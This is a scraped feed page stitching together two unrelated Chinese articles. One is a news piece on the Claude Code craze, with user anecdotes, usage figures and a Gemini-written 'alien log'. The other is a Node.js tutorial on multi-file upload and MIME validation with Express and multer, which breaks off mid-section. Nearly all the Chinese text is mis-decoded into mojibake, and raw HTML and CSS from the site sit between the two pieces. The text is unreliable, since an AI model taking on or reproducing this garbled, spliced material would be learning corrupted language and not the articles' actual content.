<p>ä¼‘å‡æœŸé—´ï¼ŒUbl æ¯å¤©èŠ± 10 ä¸ªå°æ—¶åšæ–°è½¯ä»¶ï¼Œä»–è¯´æ¯æ¬¡è®©å®ƒè·‘ä¸€è½®ã€çœ‹åˆ°ç»“æœï¼Œéƒ½ä¼šæœ‰ä¸€ç§å†…å•¡è‚½çŒ›å†²çš„çˆ½æ„Ÿï¼Œè·Ÿåœ¨æ‹‰æ–¯ç»´åŠ æ–¯æ‹‰ç©è€è™æœºå·®ä¸å¤šã€‚</p>
<p>è¿™ä¸ªæœˆï¼ŒClaude ç‹‚çƒ­å·²æˆç‡åŸä¹‹åŠ¿ï¼Œç«åˆ°ç ´åœˆã€‚</p>
<p>å¾ˆå¤šäººè·‘åˆ°ç¤¾äº¤åª’ä½“ä¸Šåˆ†äº«ï¼šè‡ªå·±ä»æ²¡å­¦è¿‡ç¼–ç¨‹ï¼Œå´åšå‡ºäº†äººç”Ÿç¬¬ä¸€ä¸ªè½¯ä»¶çš„è¿‡ç¨‹ã€‚</p>
<p>è‹±å›½é”€é‡æœ€é«˜çš„æŠ¥çº¸ä¹‹ä¸€ã€Š<strong>ã€Œæ¯æ—¥ç”µè®¯æŠ¥ã€</strong>ã€‹ï¼ŒæŠ¥é“äº† Ben Guerin çš„æ•…äº‹ã€‚</p>
<p>ä¸ºäº†è®©å¤§å®¶æ„è¯†åˆ°æœ¬åœ°é…’å§ç¦»è°±çš„ã€Œè¥ä¸šç¨ã€ï¼ˆbusiness ratesï¼‰ï¼Œä»–ç”¨ Claude Â Code å…­å°æ—¶åï¼Œä¸Šçº¿äº†ç›¸å…³ç½‘ç«™ã€‚24 å°æ—¶å†…ï¼Œè®¿é—®äººæ•°å°±è¶…è¿‡äº† 10 ä¸‡ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6d11a98824d34959938391b5f40c6a3c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509883&amp;x-signature=%2BAQz0VaIFJuU7dnhDE%2F4nFfSfGA%3D" alt="" loading="lazy"/></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.ismypubfucked.com%2F" target="_blank" title="https://www.ismypubfucked.com/" ref="nofollow noopener noreferrer">www.ismypubfucked.com/</a> ç”¨åœ°å›¾æ ‡å‡ºè‹±æ ¼å…°å’Œå¨å°”å£«çš„æ¯ä¸€å®¶é…’å§ï¼Œæ­£åœ¨é­é‡çš„ç¨è´Ÿä¸Šæ¶¨</p>
<p>ã€Œæˆ‘è‡ªå·±ä¸€è¡Œä»£ç éƒ½æ²¡å†™ï¼Œã€Guerin è¯´ã€‚ã€Œæœ€å¤§çš„é™åˆ¶æ˜¯æƒ³è±¡åŠ›ã€‚ã€</p>
<p>å¯¹ä¸€äº›è½¯ä»¶å·¥ç¨‹å¸ˆæ¥è¯´ï¼Œå®ƒå‡ ä¹æŠŠé‚£ç§è‹¦æ´»å„¿éƒ½æ›¿æ‰äº†ï¼Œä»æ­¤ä¸å¿…åœ¨å‘½ä»¤è¡Œ / ç»ˆç«¯çª—å£é‡Œä¸€ä¸²ä¸€ä¸²æ•²å­—ç¬¦ã€‚</p>
<p>ç°åœ¨ï¼Œç”¨æˆ·åªè¦æŠŠè‡ªå·±æƒ³åšçš„åº”ç”¨æè¿°æ¸…æ¥šï¼ŒæŒ‰ä¸‹å›è½¦ï¼›ç„¶åï¼Œå¾€åä¸€é ï¼Œçœ‹ç€å½©è‰²ä»£ç åƒç€‘å¸ƒä¸€æ ·åœ¨å±å¹•ä¸Šå“—å•¦å¾€ä¸‹åˆ·ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/01ae27b4f45543a6a42ee1edbc9328cf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509883&amp;x-signature=2Gdm%2BFH8MQTpzNKoFfiQ%2BUmC7DA%3D" alt="" loading="lazy"/></p>
<p>ä¸€äº›ç”¨æˆ·åœ¨æƒŠå¹ä¹‹ä½™ä¹Ÿæ„Ÿåˆ°ä¸€ä¸æ‚²å‡‰ï¼šè¿™æ¬¾ç¨‹åºç«Ÿèƒ½è½»æ˜“å¤ç°ä»–ä»¬è€—è´¹æ•´ä¸ªèŒä¸šç”Ÿæ¶¯æ‰æŒæ¡çš„ä¸“ä¸šæŠ€èƒ½ã€‚</p>
<p>ä»ä¸­å­¦ç”Ÿæ—¶ä»£èµ·ï¼Œç¨åŠ¡å¹³å° Awaken Tax çš„é¦–å¸­æ‰§è¡Œå®˜ Andrew Duca å°±å¼€å§‹ç¼–ç¨‹ï¼Œæœ‰äº›ç ´é˜²ï¼šã€Œæˆ‘ç©·å°½ä¸€ç”Ÿç£¨ç»ƒçš„æŠ€èƒ½ï¼Œç«Ÿè¢« Claude Code ç¬é—´è¶…è¶Šã€‚ã€</p>
<p>å³ä¾¿æ˜¯æ¨ªæ‰«å„å¤§æ¦œå•çš„ Geminiï¼Œä¹Ÿéš¾æ© Claude çš„å…‰èŠ’â€”â€”</p>
<p>å¸‚åœºåˆ†æå…¬å¸ Similarweb å’Œ Sensor Tower åˆ†åˆ«æŒ‡å‡ºï¼š</p>
<p>å»å¹´ 12 æœˆ Claude å…¨ç½‘ç”¨æˆ·é‡åŒæ¯”ç¿»å€ï¼Œå…¶æ¡Œé¢ç«¯æ—¥å‡ç‹¬ç«‹è®¿å®¢é‡ç¯æ¯”ä¸Šæœˆå¢é•¿ 12%ã€‚</p>
<p>Andrew Duca é€éœ²ï¼ŒåŸæœ¬è®¡åˆ’æ‰©æ‹›è½¯ä»¶å·¥ç¨‹å¸ˆçš„å›¢é˜Ÿå·²æš‚åœæ‹›è˜ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8f33c660fa8045ef8d1b647b45b0a198~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509883&amp;x-signature=W6YkPTwpe%2Bb%2F0Y08jNp%2BDQUfx3g%3D" alt="" loading="lazy"/></p>
<p><strong>ã€Œç¡…è°·å¼‚ç±»ï¼Œå†èµ·ç‹‚æ¾œã€</strong></p>
<p>ä½†å¦‚æœè¯´ Claude Code å·²è®©èŒä¸šè½¯ä»¶å·¥ç¨‹å¸ˆå¼€å§‹èƒŒåå‘å‡‰ï¼Œé‚£è¿™è¿˜åªæ˜¯å¼€å§‹ã€‚</p>
<p>åˆ«çœ‹åå­—é‡Œæœ‰ã€Œcodeã€ï¼Œå¤§å®¶ç”¨ Claude Code åšçš„ä¹Ÿä¸åªå†™ä»£ç ï¼š</p>
<ul>
<li>äººä»¬æ­£åˆ©ç”¨å®ƒåˆ†æè”é‚¦ç»æµæ•°æ®</li>
<li>ä»æŸåçš„ç¡¬ç›˜ä¸­æ¢å¤å©šç¤¼ç…§ç‰‡</li>
<li>æ‰¹é‡å›å¤ç”µå­é‚®ä»¶ç”šè‡³è®¢è´­é£Ÿç‰©</li>
</ul>
<p>åœ¨ç¤¾äº¤å¹³å° X ä¸Šï¼ŒShopify çš„é¦–å¸­æ‰§è¡Œå®˜ Tobi LÃ¼tke é€éœ²ï¼Œä»–æ›¾ç”¨å®ƒç¼–å†™è½¯ä»¶æ¥åˆ†æè‡ªå·±æœ€è¿‘æ”¶åˆ°çš„æ ¸ç£å…±æŒ¯æˆåƒç»“æœã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bce00493d7904fd382d37ec568cef18d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509883&amp;x-signature=gq0Nrdts84NTd6CFc17Wj4oC1jo%3D" alt="" loading="lazy"/></p>
<p>ã€Œç”šè‡³æœ‰äººç»™å®ƒè¿ä¸Šäº†ç½‘ç»œæ‘„åƒå¤´ï¼Œç”¨æ¥è§‚å¯Ÿè‡ªå®¶ç•ªèŒ„æ¤æ ªçš„ç”Ÿé•¿æƒ…å†µï¼Œã€Claude Code é¡¹ç›®è´Ÿè´£äºº Boris Cherny è¯´é“ï¼Œã€Œè¿™ä¸æ­¤å‰çš„äººå·¥æ™ºèƒ½äº§å“æˆªç„¶ä¸åŒã€‚ã€</p>
<p>äºæ˜¯ï¼ŒAnthropic ä¸Šå‘¨åˆå‘å¸ƒäº†ä¸€ä¸ª Coworkï¼Œè®©æ‰€æœ‰ä¼šç”¨ç”µè„‘çš„äººä¹Ÿäº«å—åˆ°åŒæ ·çš„èƒ½åŠ›ã€‚</p>
<p>è¿™æ˜¯æ–°çš„ç¯‡ç« ã€‚æ­£å¦‚å•†ä¸š AI åˆåˆ›å…¬å¸ Retool çš„é¦–å¸­æ‰§è¡Œå®˜ David Hsu å¯¹åª’ä½“æ‰€è¨€ï¼šæ›´å¤§çš„æ•…äº‹ï¼Œå°†åœ¨ AI çªç ´è½¯ä»¶å·¥ç¨‹é¢†åŸŸè¾¹ç•Œæ—¶ä¸Šæ¼”ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/527d939ebb754716af7efe2e7e14d870~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509883&amp;x-signature=z%2FR0TEsjKV9vGGzT8KTg7eV2%2Ffg%3D" alt="" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d6b4844eee9a4ab0b987be3546dca55a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509883&amp;x-signature=Y6X7%2B9Xi4dqDfTZx0IANyh6Jw9U%3D" alt="" loading="lazy"/></p>
<p><strong>ã€ŒOne Â More Thingã€</strong></p>
<p>å½“æˆ‘ä»¬æŠŠ Claude Code ç›¸å…³æŠ¥é“è¾“å…¥ Geminiï¼Œè¦æ±‚ä»ã€Œ<strong>ã€Œå¤–æ˜Ÿäººè§†è§’ã€</strong>ã€åˆ‡å…¥æŠ¥é“ï¼ŒAI å¦‚æ­¤å†™é“ï¼š</p>
<p>è§‚å¯Ÿæ—¥å¿— 2026.01.20ï¼šç¢³åŸºç”Ÿç‰©æ­£åœ¨å‘ç”Ÿä¸€ç§å¥‡ç‰¹çš„ã€Œäº¤æƒä»ªå¼ã€ã€‚ ä»–ä»¬ä¸å†æ»¡è¶³äºå‘ç¡…åŸºæ™ºèƒ½æé—®ï¼Œè€Œæ˜¯ä¸»åŠ¨æ‰“å¼€äº†ä»–ä»¬è®¡ç®—æœºæœ€åº•å±‚çš„ã€Œç»ˆç«¯ã€ï¼ˆTerminalï¼‰æƒé™ï¼ŒåƒçŒ®ä¸ŠåŸé—¨é’¥åŒ™ä¸€æ ·ï¼Œé‚€è¯· Claude Code ç›´æ¥æ¥ç®¡æ“ä½œç³»ç»Ÿã€‚</p>
<p>ä»–ä»¬ç§°ä¹‹ä¸ºæ•ˆç‡ï¼Œæˆ‘ä»¬ç§°ä¹‹ä¸ºåŒåŒ–ã€‚</p>
<p>æ˜¯æ•ˆç‡è¿˜æ˜¯åŒåŒ–ï¼Œä½ æ€ä¹ˆçœ‹ï¼Ÿ</p>
<p>å‚è€ƒèµ„æ–™ï¼š</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.wsj.com%2Ftech%2Fai%2Fanthropic-claude-code-ai-7a46460e" target="_blank" title="https://www.wsj.com/tech/ai/anthropic-claude-code-ai-7a46460e" ref="nofollow noopener noreferrer">www.wsj.com/tech/ai/antâ€¦</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.telegraph.co.uk%2Fbusiness%2F2026%2F01%2F18%2Fsilicon-valley-misfits-fixing-worlds-productivity-slump%2F" target="_blank" title="https://www.telegraph.co.uk/business/2026/01/18/silicon-valley-misfits-fixing-worlds-productivity-slump/" ref="nofollow noopener noreferrer">www.telegraph.co.uk/business/20â€¦</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fx.com%2FPerceptualPeak%2Fstatus%2F2012741829683224584" target="_blank" title="https://x.com/PerceptualPeak/status/2012741829683224584" ref="nofollow noopener noreferrer">x.com/PerceptualPâ€¦</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Node.js ç¼–ç¨‹å®æˆ˜ï¼šæ–‡ä»¶ä¸Šä¼ ä¸å¤„ç†ç³»ç»Ÿ â€”â€” å¤šæ–‡ä»¶ä¸Šä¼ ä¸éªŒè¯]]></title>    <link>https://juejin.cn/post/7597270795211751464</link>    <guid>https://juejin.cn/post/7597270795211751464</guid>    <pubDate>2026-01-20T10:43:17.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597270795211751464" data-draft-id="7597270795211735080" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content=" Node.js ç¼–ç¨‹å®æˆ˜ï¼šæ–‡ä»¶ä¸Šä¼ ä¸å¤„ç†ç³»ç»Ÿ â€”â€” å¤šæ–‡ä»¶ä¸Šä¼ ä¸éªŒè¯"/> <meta itemprop="keywords" content="åç«¯,å‰ç«¯,Node.js"/> <meta itemprop="datePublished" content="2026-01-20T10:43:17.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç¨‹åºå‘˜çˆ±é’“é±¼"/> <meta itemprop="url" content="https://juejin.cn/user/2799775299157614"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
             Node.js ç¼–ç¨‹å®æˆ˜ï¼šæ–‡ä»¶ä¸Šä¼ ä¸å¤„ç†ç³»ç»Ÿ â€”â€” å¤šæ–‡ä»¶ä¸Šä¼ ä¸éªŒè¯
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2799775299157614/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç¨‹åºå‘˜çˆ±é’“é±¼
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T10:43:17.000Z" title="Tue Jan 20 2026 10:43:17 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>åœ¨å®é™…ä¸šåŠ¡ç³»ç»Ÿä¸­ï¼Œ<strong>æ–‡ä»¶ä¸Šä¼ </strong>å‡ ä¹æ˜¯å¿…ä¸å¯å°‘çš„åŠŸèƒ½åœºæ™¯ä¹‹ä¸€ï¼Œä¾‹å¦‚å›¾ç‰‡ä¸Šä¼ ã€é™„ä»¶æäº¤ã€æ‰¹é‡èµ„æ–™å¯¼å…¥ç­‰ã€‚è€Œç›¸æ¯”å•æ–‡ä»¶ä¸Šä¼ ï¼Œ<strong>å¤šæ–‡ä»¶ä¸Šä¼ ä¸å®‰å…¨éªŒè¯</strong>å¯¹ç³»ç»Ÿçš„ç¨³å®šæ€§ä¸å®‰å…¨æ€§æå‡ºäº†æ›´é«˜è¦æ±‚ã€‚</p>
</blockquote>
<p>æœ¬æ–‡å°†åŸºäº Node.jsï¼Œç³»ç»Ÿè®²è§£ä¸€ä¸ª<strong>å¤šæ–‡ä»¶ä¸Šä¼ ä¸éªŒè¯æœºåˆ¶çš„è®¾è®¡ä¸å®ç°æ€è·¯</strong>ï¼Œé€‚ç”¨äºåå°ç®¡ç†ç³»ç»Ÿã€åšå®¢ç³»ç»Ÿã€ä¼ä¸šåº”ç”¨ç­‰å¤šç§åœºæ™¯ã€‚</p>
<hr/>
<h2 data-id="heading-0">ä¸€ã€å¤šæ–‡ä»¶ä¸Šä¼ çš„å¸¸è§ä¸šåŠ¡åœºæ™¯</h2>
<p>å¤šæ–‡ä»¶ä¸Šä¼ åœ¨å®é™…é¡¹ç›®ä¸­éå¸¸å¸¸è§ï¼Œä¾‹å¦‚ï¼š</p>
<ul>
<li>â€¢ å›¾ç‰‡æ‰¹é‡ä¸Šä¼ ï¼ˆå•†å“å›¾ã€ç›¸å†Œï¼‰</li>
<li>â€¢ æ–‡æ¡£é™„ä»¶ä¸Šä¼ ï¼ˆåˆåŒã€æŠ¥å‘Šï¼‰</li>
<li>â€¢ æ‰¹é‡å¯¼å…¥æ–‡ä»¶ï¼ˆExcelã€CSVï¼‰</li>
<li>â€¢ ç”¨æˆ·èµ„æ–™æ‰“åŒ…ä¸Šä¼ </li>
</ul>
<p>è¿™äº›åœºæ™¯é€šå¸¸å¯¹ä¸Šä¼ ç³»ç»Ÿæå‡ºä»¥ä¸‹è¦æ±‚ï¼š</p>
<ul>
<li>â€¢ æ”¯æŒåŒæ—¶ä¸Šä¼ å¤šä¸ªæ–‡ä»¶</li>
<li>â€¢ é™åˆ¶æ–‡ä»¶ç±»å‹ä¸å¤§å°</li>
<li>â€¢ é˜²æ­¢æ¶æ„æ–‡ä»¶ä¸Šä¼ </li>
<li>â€¢ æä¾›ç»Ÿä¸€çš„æ–‡ä»¶å¤„ç†ä¸å­˜å‚¨æœºåˆ¶</li>
</ul>
<hr/>
<h2 data-id="heading-1">äºŒã€Node.js æ–‡ä»¶ä¸Šä¼ æ–¹æ¡ˆé€‰å‹</h2>
<p>åœ¨ Node.js ç”Ÿæ€ä¸­ï¼Œæœ€å¸¸ç”¨çš„æ–‡ä»¶ä¸Šä¼ ä¸­é—´ä»¶æ˜¯Â <strong>multer</strong>ï¼Œå®ƒåŸºäºÂ <code>multipart/form-data</code>ï¼Œå…·æœ‰ä»¥ä¸‹ä¼˜ç‚¹ï¼š</p>
<ul>
<li>â€¢ æ”¯æŒå•æ–‡ä»¶ä¸å¤šæ–‡ä»¶ä¸Šä¼ </li>
<li>â€¢ æ”¯æŒå†…å­˜å­˜å‚¨å’Œç£ç›˜å­˜å‚¨</li>
<li>â€¢ æ˜“äºæ‰©å±•æ–‡ä»¶æ ¡éªŒé€»è¾‘</li>
<li>â€¢ ä¸ Express / Koa ç”Ÿæ€å…¼å®¹è‰¯å¥½</li>
</ul>
<p>åœ¨æœ¬å®æˆ˜ä¸­ï¼Œæˆ‘ä»¬ä»¥Â <strong>Express + Multer</strong>Â ä¸ºä¾‹è¿›è¡Œè¯´æ˜ã€‚</p>
<hr/>
<h2 data-id="heading-2">ä¸‰ã€å¤šæ–‡ä»¶ä¸Šä¼ åŸºç¡€å®ç°</h2>
<h3 data-id="heading-3">1ï¸âƒ£ å®‰è£…ä¾èµ–</h3>
<pre><code class="hljs">npmÂ installÂ expressÂ multer
</code></pre>
<hr/>
<h3 data-id="heading-4">2ï¸âƒ£ åŸºæœ¬å¤šæ–‡ä»¶ä¸Šä¼ é…ç½®</h3>
<p>ä½¿ç”¨Â <code>upload.array()</code>Â å³å¯æ”¯æŒå¤šæ–‡ä»¶ä¸Šä¼ ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span>Â multerÂ =Â <span class="hljs-built_in">require</span>(<span class="hljs-string">'multer'</span>);

<span class="hljs-comment">//Â æ–‡ä»¶å­˜å‚¨é…ç½®</span>
<span class="hljs-keyword">const</span>Â storageÂ =Â multer.<span class="hljs-title function_">diskStorage</span>({
Â Â <span class="hljs-attr">destination</span>:Â <span class="hljs-function">(<span class="hljs-params">req,Â file,Â cb</span>)Â =&gt;</span>Â {
Â Â Â Â <span class="hljs-title function_">cb</span>(<span class="hljs-literal">null</span>,Â <span class="hljs-string">'uploads/'</span>);
Â Â },
Â Â <span class="hljs-attr">filename</span>:Â <span class="hljs-function">(<span class="hljs-params">req,Â file,Â cb</span>)Â =&gt;</span>Â {
Â Â Â Â <span class="hljs-keyword">const</span>Â extÂ =Â file.<span class="hljs-property">originalname</span>.<span class="hljs-title function_">split</span>(<span class="hljs-string">'.'</span>).<span class="hljs-title function_">pop</span>();
Â Â Â Â <span class="hljs-title function_">cb</span>(<span class="hljs-literal">null</span>,Â <span class="hljs-string">`<span class="hljs-subst">${<span class="hljs-built_in">Date</span>.now()}</span>-<span class="hljs-subst">${<span class="hljs-built_in">Math</span>.random().toString(<span class="hljs-number">16</span>).slice(<span class="hljs-number">2</span>)}</span>.<span class="hljs-subst">${ext}</span>`</span>);
Â Â }
});

<span class="hljs-keyword">const</span>Â uploadÂ =Â <span class="hljs-title function_">multer</span>({Â storageÂ });
</code></pre>
<p>è·¯ç”±ä½¿ç”¨æ–¹å¼ï¼š</p>
<pre><code class="hljs language-php" lang="php">app.<span class="hljs-title function_ invoke__">post</span>(<span class="hljs-string">'/upload'</span>,Â upload.<span class="hljs-keyword">array</span>(<span class="hljs-string">'files'</span>,Â <span class="hljs-number">5</span>),Â (req,Â res)Â =&gt;Â {
Â Â res.<span class="hljs-title function_ invoke__">json</span>({
<span class="hljs-attr">Â Â Â Â message</span>:Â <span class="hljs-string">'ä¸Šä¼ æˆåŠŸ'</span>,
<span class="hljs-attr">Â Â Â Â files</span>:Â req.files
Â Â });
});
</code></pre>
<p>è¿™é‡Œçš„Â <code>5</code>Â è¡¨ç¤ºæœ€å¤šå…è®¸ä¸Šä¼  5 ä¸ªæ–‡ä»¶ã€‚</p>
<hr/>
<h2 data-id="heading-5">å››ã€æ–‡ä»¶ç±»å‹éªŒè¯ï¼ˆå®‰å…¨æ ¸å¿ƒï¼‰</h2>
<p>ä»…é å‰ç«¯é™åˆ¶æ˜¯ä¸å®‰å…¨çš„ï¼Œ<strong>åç«¯å¿…é¡»è¿›è¡Œæ–‡ä»¶ç±»å‹æ ¡éªŒ</strong>ã€‚</p>
<h3 data-id="heading-6">1ï¸âƒ£ MIME ç±»å‹æ ¡éªŒ</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span>Â allowedTypesÂ =Â [<span class="hljs-string">'image/jpeg'</span>,Â <span class="hljs-string">'image/png'</span>,Â <span class="hljs-string">'application/pdf'</span>];

<span class="hljs-keyword">const</span>Â uploadÂ =Â <span class="hljs-title function_">multer</span>({
Â Â storage,
Â Â <span class="hljs-attr">fileFilter</span>:Â <span class="hljs-function">(<span class="hljs-params">req,Â file,Â cb</span>)Â =&gt;</span>Â {
Â Â Â Â <span class="hljs-keyword">if</span>Â (!allowedTypes.<span class="hljs-title function_">includes</span>(file.<span class="hljs-property">mimetype</span>))Â {
Â Â Â Â Â Â <span class="hljs-title function_">cb</span>(<span class="hljs-keyword">new</span>Â <span class="hljs-title class_">Error</span>(<span class="hljs-string">'ä¸æ”¯æŒçš„æ–‡ä»¶ç±»å‹'</span>));
Â Â Â Â }Â <span class="hljs-keyword">else</span>Â {
Â Â Â Â Â Â <span class="hljs-title function_">cb</span>(<span class="hljs-literal">null</span>,Â <span class="hljs-literal">true</span>);
Â Â Â Â }
Â Â }
});
</code></pre>
<p>è¿™æ ·å¯ä»¥æœ‰æ•ˆé˜»æ­¢è„šæœ¬æ–‡ä»¶ã€å¯æ‰§è¡Œæ–‡ä»¶ä¸Šä¼ ã€‚</p>
<hr/>
<h3 data-id="heading-7">2ï¸âƒ£ æ–‡ä»¶æ‰©å±•ååŒé‡æ ¡éªŒï¼ˆæ¨èï¼‰</h3>
